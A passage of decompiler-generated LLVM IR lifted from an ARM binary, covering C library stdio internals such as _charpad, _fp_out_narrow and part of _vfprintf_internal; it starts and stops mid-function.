  %v2_b304 = icmp eq i32 %v1_b300, 0
  %v0_b308 = load i32, i32* @r5, align 4
  store i32 %v0_b308, i32* @r0, align 4
  br i1 %v2_b304, label %dec_label_pc_b334, label %dec_label_pc_b310

dec_label_pc_b310:                                ; preds = %dec_label_pc_b2f8
  %v0_b310 = load i32, i32* @r4, align 4
  %v1_b310 = add i32 %v0_b310, 8
  %v2_b310 = inttoptr i32 %v1_b310 to i32*
  %v3_b310 = load i32, i32* %v2_b310, align 4
  store i32 %v3_b310, i32* %r3.global-to-local, align 4
  %v3_b318 = inttoptr i32 %v0_b310 to i8*
  store i8 48, i8* %v3_b318, align 1
  %v2_b320 = load i32, i32* @r4, align 4
  %v3_b320 = add i32 %v2_b320, 1
  %v4_b320 = inttoptr i32 %v3_b320 to i8*
  store i8 0, i8* %v4_b320, align 1
  %v0_b324 = load i32, i32* %r3.global-to-local, align 4
  %v1_b324 = load i32, i32* @r4, align 4
  %v2_b324 = add i32 %v1_b324, 20
  %v3_b324 = inttoptr i32 %v2_b324 to i32*
  store i32 %v0_b324, i32* %v3_b324, align 4
  %v0_b328 = load i32, i32* %r3.global-to-local, align 4
  %v1_b328 = load i32, i32* @r4, align 4
  %v2_b328 = add i32 %v1_b328, 24
  %v3_b328 = inttoptr i32 %v2_b328 to i32*
  store i32 %v0_b328, i32* %v3_b328, align 4
  %v0_b32c = load i32, i32* %r3.global-to-local, align 4
  %v1_b32c = load i32, i32* @r4, align 4
  %v2_b32c = add i32 %v1_b32c, 28
  %v3_b32c = inttoptr i32 %v2_b32c to i32*
  store i32 %v0_b32c, i32* %v3_b32c, align 4
  %v0_b330 = load i32, i32* %r3.global-to-local, align 4
  %v1_b330 = load i32, i32* @r4, align 4
  %v2_b330 = add i32 %v1_b330, 16
  %v3_b330 = inttoptr i32 %v2_b330 to i32*
  store i32 %v0_b330, i32* %v3_b330, align 4
  br label %dec_label_pc_b334

dec_label_pc_b334:                                ; preds = %dec_label_pc_b2f8, %dec_label_pc_b310
  store i32 1, i32* @r3, align 4
  %v1_b338 = load i32, i32* @r4, align 4
  %v2_b338 = add i32 %v1_b338, 52
  %v3_b338 = inttoptr i32 %v2_b338 to i32*
  store i32 1, i32* %v3_b338, align 4
  %v0_b33c = call i32 @__stdio_init_mutex()
  store i32 %v0_b33c, i32* %r0.global-to-local, align 4
  %v0_b340 = load i32, i32* @r4, align 4
  %v1_b340 = add i32 %v0_b340, 32
  %v2_b340 = inttoptr i32 %v1_b340 to i32*
  %storemerge = load i32, i32* %v2_b340, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_b344 = add i32 %storemerge, 56
  store i32 %v1_b344, i32* @r5, align 4
  %v2_b348 = icmp eq i32 %storemerge, 0
  store i32 %v1_b344, i32* %r0.global-to-local, align 4
  br i1 %v2_b348, label %dec_label_pc_b344.dec_label_pc_b354_crit_edge, label %dec_label_pc_b2f8

dec_label_pc_b344.dec_label_pc_b354_crit_edge:    ; preds = %dec_label_pc_b334
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1e488.433 to i32*), align 4
  br label %dec_label_pc_b354

dec_label_pc_b354:                                ; preds = %dec_label_pc_b344.dec_label_pc_b354_crit_edge, %entry
  %v11_b37c13 = phi i32 [ %v1_b344, %dec_label_pc_b344.dec_label_pc_b354_crit_edge ], [ %v1_b3446, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_b344.dec_label_pc_b354_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_1e488.433 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_b3744 = icmp eq i32 %storemerge12, 0
  br i1 %v2_b3744, label %dec_label_pc_b37c, label %dec_label_pc_b360

dec_label_pc_b360:                                ; preds = %dec_label_pc_b354, %dec_label_pc_b360
  %v0_b368 = phi i32 [ %storemerge1, %dec_label_pc_b360 ], [ %storemerge12, %dec_label_pc_b354 ]
  %v1_b360 = inttoptr i32 %v0_b368 to i8*
  %v2_b360 = load i8, i8* %v1_b360, align 1
  %v3_b360 = zext i8 %v2_b360 to i32
  store i32 %v3_b360, i32* %r3.global-to-local, align 4
  %v1_b364 = and i32 %v3_b360, 64
  store i32 %v0_b368, i32* %r0.global-to-local, align 4
  store i32 45936, i32* @lr, align 4
  %v1_b36c = icmp ne i32 %v1_b364, 0
  call void @__pseudo_cond_branch(i1 %v1_b36c, i32 ptrtoint (i32* @global_var_b390.444 to i32))
  %v0_b370 = load i32, i32* %r4.global-to-local, align 4
  %v1_b370 = add i32 %v0_b370, 32
  %v2_b370 = inttoptr i32 %v1_b370 to i32*
  %storemerge1 = load i32, i32* %v2_b370, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_b374 = icmp eq i32 %storemerge1, 0
  br i1 %v2_b374, label %dec_label_pc_b374.dec_label_pc_b37c_crit_edge, label %dec_label_pc_b360

dec_label_pc_b374.dec_label_pc_b37c_crit_edge:    ; preds = %dec_label_pc_b360
  %v11_b37c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b37c

dec_label_pc_b37c:                                ; preds = %dec_label_pc_b374.dec_label_pc_b37c_crit_edge, %dec_label_pc_b354
  %v11_b37c = phi i32 [ %v11_b37c.pre, %dec_label_pc_b374.dec_label_pc_b37c_crit_edge ], [ %v11_b37c13, %dec_label_pc_b354 ]
  %v2_b37c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b37c, i32* @r4, align 4
  ret i32 %v11_b37c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_b360, { 1, 0 }
  uselistorder label %dec_label_pc_b334, { 1, 0 }
  uselistorder label %dec_label_pc_b2f8, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b390 = load i32, i32* @r4, align 4
  store i32 %v3_b390, i32* %stack_var_-8, align 4
  %v0_b394 = load i32, i32* @r0, align 4
  %v1_b394 = add i32 %v0_b394, 8
  %v2_b394 = inttoptr i32 %v1_b394 to i32*
  %v3_b394 = load i32, i32* %v2_b394, align 4
  %v1_b398 = add i32 %v0_b394, 16
  %v2_b398 = inttoptr i32 %v1_b398 to i32*
  %v3_b398 = load i32, i32* %v2_b398, align 4
  %v9_b39c = icmp eq i32 %v3_b398, %v3_b394
  store i32 %v0_b394, i32* %r4.global-to-local, align 4
  br i1 %v9_b39c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_b394, i32* %v2_b398, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 46000, i32* @lr, align 4
  %v1_b3ac = xor i1 %v9_b39c, true
  call void @__pseudo_cond_branch(i1 %v1_b3ac, i32 ptrtoint (i32* @global_var_ee04.445 to i32))
  %v0_b3b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3b0 = add i32 %v0_b3b0, 8
  %v2_b3b0 = inttoptr i32 %v1_b3b0 to i32*
  %v3_b3b0 = load i32, i32* %v2_b3b0, align 4
  %v1_b3b4 = add i32 %v0_b3b0, 16
  %v2_b3b4 = inttoptr i32 %v1_b3b4 to i32*
  %v3_b3b4 = load i32, i32* %v2_b3b4, align 4
  %v2_b3b8 = sub i32 %v3_b3b4, %v3_b3b0
  %v2_b3bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b3bc, i32* @r4, align 4
  ret i32 %v2_b3b8

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_b3c0 = load i32, i32* @r4, align 4
  %v6_b3c0 = load i32, i32* @r5, align 4
  %v9_b3c0 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_b3e02 = icmp eq i32 %arg3, 0
  %v2_b3e4 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_b3e02, label %dec_label_pc_b400, label %dec_label_pc_b3f4

dec_label_pc_b3dc:                                ; preds = %dec_label_pc_b3f4
  %v1_b3dc = add i32 %v0_b3dc, -1
  store i32 %v1_b3dc, i32* @r4, align 4
  %v2_b3e0 = icmp eq i32 %v1_b3dc, 0
  %v0_b3ec = load i32, i32* @r6, align 4
  br i1 %v2_b3e0, label %dec_label_pc_b400.loopexit, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %entry, %dec_label_pc_b3dc
  %v0_b3ec4 = phi i32 [ %v0_b3ec, %dec_label_pc_b3dc ], [ %arg1, %entry ]
  %v3_b3f4 = call i32 @__stdio_fwrite(i32 %v2_b3e4, i32 1, i32 %v0_b3ec4)
  %v7_b3f8 = icmp eq i32 %v3_b3f4, 1
  %v0_b3dc = load i32, i32* @r4, align 4
  br i1 %v7_b3f8, label %dec_label_pc_b3dc, label %dec_label_pc_b400.loopexit

dec_label_pc_b400.loopexit:                       ; preds = %dec_label_pc_b3dc, %dec_label_pc_b3f4
  %v0_b400.ph = phi i32 [ %v0_b3dc, %dec_label_pc_b3f4 ], [ 0, %dec_label_pc_b3dc ]
  %v1_b400.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b400

dec_label_pc_b400:                                ; preds = %dec_label_pc_b400.loopexit, %entry
  %v1_b400 = phi i32 [ 0, %entry ], [ %v1_b400.pre, %dec_label_pc_b400.loopexit ]
  %v0_b400 = phi i32 [ 0, %entry ], [ %v0_b400.ph, %dec_label_pc_b400.loopexit ]
  %v2_b400 = sub i32 %v1_b400, %v0_b400
  store i32 %v3_b3c0, i32* @r4, align 4
  store i32 %v6_b3c0, i32* @r5, align 4
  store i32 %v9_b3c0, i32* @r6, align 4
  ret i32 %v2_b400

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b400.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b40c = load i32, i32* @r4, align 4
  store i32 %v3_b40c, i32* %stack_var_-24, align 4
  %v9_b40c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_b414 = and i32 %arg2, 128
  %v2_b414 = icmp eq i32 %v1_b414, 0
  %v0_b418 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b418, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_b414, label %bb, label %dec_label_pc_b42c

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b46c

dec_label_pc_b42c:                                ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_b430 = call i32 @strlen(i8* %arg4)
  store i32 %v3_b430, i32* %r0.global-to-local, align 4
  %v1_b434 = load i32, i32* %r4.global-to-local, align 4
  %v2_b434 = sub i32 %v1_b434, %v3_b430
  store i32 %v2_b434, i32* @r4, align 4
  store i32 %v3_b430, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_b434, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_b44c

.thread:                                          ; preds = %dec_label_pc_b42c
  store i32 %v3_b430, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b46c

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b42c
  %v0_b44c = load i32, i32* @r6, align 4
  %v1_b44c = urem i32 %v0_b44c, 128
  %v0_b450 = load i32, i32* @r8, align 4
  store i32 %v0_b450, i32* %r0.global-to-local, align 4
  %v3_b458 = trunc i32 %v1_b44c to i8
  %v4_b458 = call i32 @_charpad(i32 %v0_b450, i8 %v3_b458, i32 %v2_b434)
  store i32 %v4_b458, i32* %r0.global-to-local, align 4
  %v1_b45c = load i32, i32* @r4, align 4
  %v9_b45c = icmp eq i32 %v4_b458, %v1_b45c
  store i32 %v4_b458, i32* %r6.global-to-local, align 4
  br i1 %v9_b45c, label %dec_label_pc_b468, label %dec_label_pc_b488

dec_label_pc_b468:                                ; preds = %dec_label_pc_b44c
  %v0_b468 = load i32, i32* @r5, align 4
  store i32 %v0_b468, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b46c

dec_label_pc_b46c:                                ; preds = %bb, %.thread, %dec_label_pc_b468
  %v5_b478 = phi i32 [ %v0_b468, %dec_label_pc_b468 ], [ %arg3, %bb ], [ %v3_b430, %.thread ]
  %tmp17 = icmp slt i32 %v5_b478, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_b46c
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_b46c
  %v5_b474 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_b474, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_eec0.446 to i32))
  %v0_b484 = load i32, i32* %r6.global-to-local, align 4
  %v2_b484 = add i32 %storemerge, %v0_b484
  store i32 %v2_b484, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b488

dec_label_pc_b488:                                ; preds = %dec_label_pc_b44c, %bb19
  %v0_b488 = phi i32 [ %v4_b458, %dec_label_pc_b44c ], [ %v2_b484, %bb19 ]
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v2_b48c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b48c, i32* %r4.global-to-local, align 4
  store i32 %v9_b40c, i32* %r6.global-to-local, align 4
  ret i32 %v0_b488

; uselistorder directives
  uselistorder i32 %v0_b488, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_b488, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_b46c, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_1()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_1()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_b490 = load i32, i32* @r4, align 4
  store i32 %v3_b490, i32* %stack_var_-36, align 4
  %v6_b490 = load i32, i32* @r5, align 4
  %v15_b490 = load i32, i32* @r8, align 4
  %v18_b490 = load i32, i32* @sb, align 4
  %v21_b490 = load i32, i32* @sl, align 4
  %v24_b490 = load i32, i32* @fp, align 4
  %v2_b498 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_b498, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_b498, i32* %r0.global-to-local, align 4
  %v0_b4a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_b4a4, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_b4ac = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_b4ac, i32* %r0.global-to-local, align 4
  %v1_b4b0 = icmp slt i32 %v2_b4ac, 0
  br i1 %v1_b4b0, label %dec_label_pc_b4b8, label %dec_label_pc_b4ec

dec_label_pc_b4b8:                                ; preds = %entry
  %v3_b4b8 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_b4b8, i32* @r4, align 4
  %v1_b4bc = inttoptr i32 %v3_b4b8 to i8*
  store i32 %v3_b4b8, i32* %r0.global-to-local, align 4
  %v3_b4c0 = call i32 @strlen(i8* %v1_b4bc)
  store i32 %v3_b4c0, i32* %r0.global-to-local, align 4
  %v2_b4c4 = icmp eq i32 %v3_b4c0, 0
  br i1 %v2_b4c4, label %bb, label %dec_label_pc_b4d4

bb:                                               ; preds = %dec_label_pc_b4b8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba64

dec_label_pc_b4d4:                                ; preds = %dec_label_pc_b4b8
  %v0_b4d4 = load i32, i32* @r4, align 4
  store i32 %v0_b4d4, i32* %r0.global-to-local, align 4
  %v0_b4d8 = load i32, i32* @fp, align 4
  store i32 %v0_b4d8, i32* %r2.global-to-local, align 4
  %v3_b4dc = call i32 @__stdio_fwrite(i32 %v0_b4d4, i32 %v3_b4c0, i32 %v0_b4d8)
  store i32 %v3_b4dc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ba64

dec_label_pc_b4ec:                                ; preds = %entry
  store i32 %v2_b498, i32* %r0.global-to-local, align 4
  %v0_b4f0 = load i32, i32* @r5, align 4
  %v2_b4f4 = call i32 @_ppfs_prepargs(i32 %v2_b498, i32 %v0_b4f0)
  store i32 %v2_b4f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_b594 = zext i8 %tmp104 to i32
  %v2_b59c = ptrtoint i32* %stack_var_-252 to i32
  %v2_b5bc = ptrtoint i32* %stack_var_-36 to i32
  %v2_b5d4 = icmp eq i32 %tmp102, 0
  %v1_b5e8 = inttoptr i32 %tmp101 to i32*
  %v2_b8d8 = ptrtoint i32* %stack_var_-180 to i32
  %v2_b7f4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_b808 = ptrtoint i32* %stack_var_-52 to i32
  %v3_b7a4 = add i32 %tmp101, 4
  %v4_b7a4 = inttoptr i32 %v3_b7a4 to i32*
  %v2_b7a8 = ptrtoint i32* %stack_var_-328 to i32
  %v7_b668 = zext i8 %tmp99 to i32
  %v2_b6a4 = ptrtoint i32* %stack_var_-53 to i32
  %v5_b6ac = bitcast i32* %stack_var_-53 to i8*
  %v2_b6b4 = icmp ugt i32 %tmp102, 4
  %v7_b6b4 = icmp eq i32 %tmp102, 5
  %v0_ba4c.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_b5cc187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_b7c8 = icmp ugt i32 %tmp102, 16
  %v7_b7c8 = icmp eq i32 %tmp102, 17
  %v2_b7cc = xor i1 %v7_b7c8, true
  %v3_b7cc = and i1 %v2_b7c8, %v2_b7cc
  %v2_b868 = icmp ugt i32 %tmp102, 18
  %v7_b868 = icmp eq i32 %tmp102, 19
  %v2_b86c = xor i1 %v7_b868, true
  %v3_b86c = and i1 %v2_b868, %v2_b86c
  %v7_b8cc = icmp eq i32 %tmp102, 20
  %v2_b60c = add i32 %tmp102, ptrtoint (i32* @global_var_14368.448 to i32)
  %v1_b610 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_14368.448 to i32), i32 -1)
  %v2_b610 = inttoptr i32 %v1_b610 to i8*
  %v2_b63c = xor i1 %v7_b6b4, true
  %v3_b63c = and i1 %v2_b6b4, %v2_b63c
  %v7_b670 = icmp eq i32 %tmp102, 1
  %v2_b6bc = xor i1 %v2_b6b4, true
  %v3_b6bc = or i1 %v7_b6b4, %v2_b6bc
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_b724 = icmp eq i32 %tmp102, 3
  %v11_b730 = icmp eq i32 %tmp102, 4
  %v9_b5a0 = mul nuw nsw i32 %v4_b594, 8
  %v10_b5a0 = add nsw i32 %v9_b5a0, -8
  %v6_b5a8 = add i32 %v10_b5a0, %v2_b59c
  br label %dec_label_pc_ba4c

bb126:                                            ; preds = %dec_label_pc_b504.outer, %.thread7
  %v2_b504185 = phi i8 [ %v2_b504, %.thread7 ], [ %v2_b504181, %dec_label_pc_b504.outer ]
  %v1_b518184 = phi i32 [ %v2_b518, %.thread7 ], [ %v0_b50449, %dec_label_pc_b504.outer ]
  %v8_b50c = icmp eq i8 %v2_b504185, 37
  br i1 %v8_b50c, label %dec_label_pc_b520, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_b518 = add i32 %v1_b518184, 1
  store i32 %v2_b518, i32* @r4, align 4
  %v1_b504 = inttoptr i32 %v2_b518 to i8*
  %v2_b504 = load i8, i8* %v1_b504, align 1
  %v3_b504 = zext i8 %v2_b504 to i32
  store i32 %v3_b504, i32* %r3.global-to-local, align 4
  %v2_b508 = icmp eq i8 %v2_b504, 0
  br i1 %v2_b508, label %dec_label_pc_b520, label %bb126

dec_label_pc_b520:                                ; preds = %bb126, %.thread7, %dec_label_pc_b504.outer
  %v1_b518.lcssa = phi i32 [ %v0_b50449, %dec_label_pc_b504.outer ], [ %v2_b518, %.thread7 ], [ %v1_b518184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b520 = sub i32 %v1_b518.lcssa, %v5_b530
  %v9_b520 = icmp eq i32 %v1_b518.lcssa, %v5_b530
  br i1 %v9_b520, label %dec_label_pc_b554, label %dec_label_pc_b528

dec_label_pc_b528:                                ; preds = %dec_label_pc_b520
  store i32 %v2_b520, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_b520, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_b528
  store i32 %v5_b530, i32* %r0.global-to-local, align 4
  %v5_b538 = load i32, i32* @fp, align 4
  store i32 %v5_b538, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_b528, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_b528 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_eec0.446 to i32))
  %v0_b540 = load i32, i32* %r0.global-to-local, align 4
  %v1_b540 = load i32, i32* @r5, align 4
  %v9_b540 = icmp eq i32 %v0_b540, %v1_b540
  br i1 %v9_b540, label %dec_label_pc_b548, label %dec_label_pc_ba5c

dec_label_pc_b548:                                ; preds = %bb130
  %v2_b54c = add i32 %v0_b540, %stack_var_-336.1.ph
  store i32 %v2_b54c, i32* @lr, align 4
  %v0_b554.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b520, %dec_label_pc_b548
  %v0_b568 = phi i32 [ %v5_b530, %dec_label_pc_b520 ], [ %v0_b554.pre, %dec_label_pc_b548 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_b520 ], [ %v2_b54c, %dec_label_pc_b548 ]
  %v1_b554 = inttoptr i32 %v0_b568 to i8*
  %v2_b554 = load i8, i8* %v1_b554, align 1
  %v3_b554 = zext i8 %v2_b554 to i32
  store i32 %v3_b554, i32* %r3.global-to-local, align 4
  %v2_b558 = icmp eq i8 %v2_b554, 0
  br i1 %v2_b558, label %dec_label_pc_ba64, label %dec_label_pc_b560

dec_label_pc_b560:                                ; preds = %dec_label_pc_b554
  %v1_b560 = add i32 %v0_b568, 1
  %v2_b560 = inttoptr i32 %v1_b560 to i8*
  %v3_b560 = load i8, i8* %v2_b560, align 1
  %v4_b560 = zext i8 %v3_b560 to i32
  store i32 %v4_b560, i32* %r3.global-to-local, align 4
  %v7_b564 = icmp eq i8 %v3_b560, 37
  store i32 %v1_b560, i32* %r2.global-to-local, align 4
  br i1 %v7_b564, label %dec_label_pc_ba54, label %dec_label_pc_b570

dec_label_pc_b570:                                ; preds = %dec_label_pc_b560
  store i32 %v2_b498, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_b498, i32* %r0.global-to-local, align 4
  store i32 %v1_b560, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b584 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_b498, i32* @r0, align 4
  %v0_b58c = call i32 @_ppfs_setargs()
  store i32 %v0_b58c, i32* %r0.global-to-local, align 4
  store i32 %v4_b594, i32* @ip, align 4
  store i32 %v2_b59c, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_b570
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_b570
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_b5a8, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_b5b478 = phi i32 [ %v6_b5a8, %bb133 ], [ %v2_b59c, %.thread ]
  store i32 %v2_b5bc, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_b5cc187, label %dec_label_pc_b5b4, label %dec_label_pc_b5d0

dec_label_pc_b5b4:                                ; preds = %bb134, %dec_label_pc_b5b4
  %v5_b5c4189 = phi i32 [ %v5_b5c4, %dec_label_pc_b5b4 ], [ %v2_b5bc, %bb134 ]
  %v0_b5b4188 = phi i32 [ %v1_b5b8, %dec_label_pc_b5b4 ], [ %v0_b5b478, %bb134 ]
  %v2_b5b4 = add i32 %v5_b5c4189, -4
  %v3_b5b4 = inttoptr i32 %v2_b5b4 to i32*
  store i32 %v0_b5b4188, i32* %v3_b5b4, align 4
  %v0_b5b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5b8 = add i32 %v0_b5b8, 8
  store i32 %v1_b5b8, i32* %r3.global-to-local, align 4
  %v0_b5c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b5c0.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_b5bc, i32* @lr, align 4
  %v4_b5c4 = mul i32 %v0_b5c0.pre, 4
  %v5_b5c4 = add i32 %v4_b5c4, %v2_b5bc
  %v1_b5c8 = add i32 %v0_b5c0.pre, 1
  store i32 %v1_b5c8, i32* %r2.global-to-local, align 4
  %v5_b5cc = icmp slt i32 %v0_b5c0.pre, %v1_b5c0.pre
  br i1 %v5_b5cc, label %dec_label_pc_b5b4, label %dec_label_pc_b5d0

dec_label_pc_b5d0:                                ; preds = %dec_label_pc_b5b4, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_b5d4, label %dec_label_pc_b5dc, label %dec_label_pc_b600

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5d0
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_b5e8 = load i32, i32* %v1_b5e8, align 4
  store i32 %v2_b5e8, i32* %r0.global-to-local, align 4
  %v1_b5ec = and i32 %v0_b630, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_b5f4 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_b5f4, i32* %r3.global-to-local, align 4
  %v4_b5f8 = inttoptr i32 %v2_b5e8 to i8*
  %v5_b5f8 = call i32 @_store_inttype(i8* %v4_b5f8, i32 %v1_b5ec, i32 %stack_var_-336.2, i32 %v3_b5f4)
  store i32 %v5_b5f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ba48

dec_label_pc_b600:                                ; preds = %dec_label_pc_b5d0
  br i1 %tmp195, label %dec_label_pc_b78c, label %dec_label_pc_b608

dec_label_pc_b608:                                ; preds = %dec_label_pc_b600
  store i32 %v2_b60c, i32* %r3.global-to-local, align 4
  %v3_b610 = load i8, i8* %v2_b610, align 1
  %v4_b610 = zext i8 %v3_b610 to i32
  store i32 %v4_b610, i32* @r4, align 4
  %v7_b614 = icmp eq i8 %v3_b610, 10
  br i1 %v7_b614, label %dec_label_pc_b620, label %bb135

bb135:                                            ; preds = %dec_label_pc_b608
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_b620:                                ; preds = %dec_label_pc_b608
  store i32 %v0_b630, i32* %r3.global-to-local, align 4
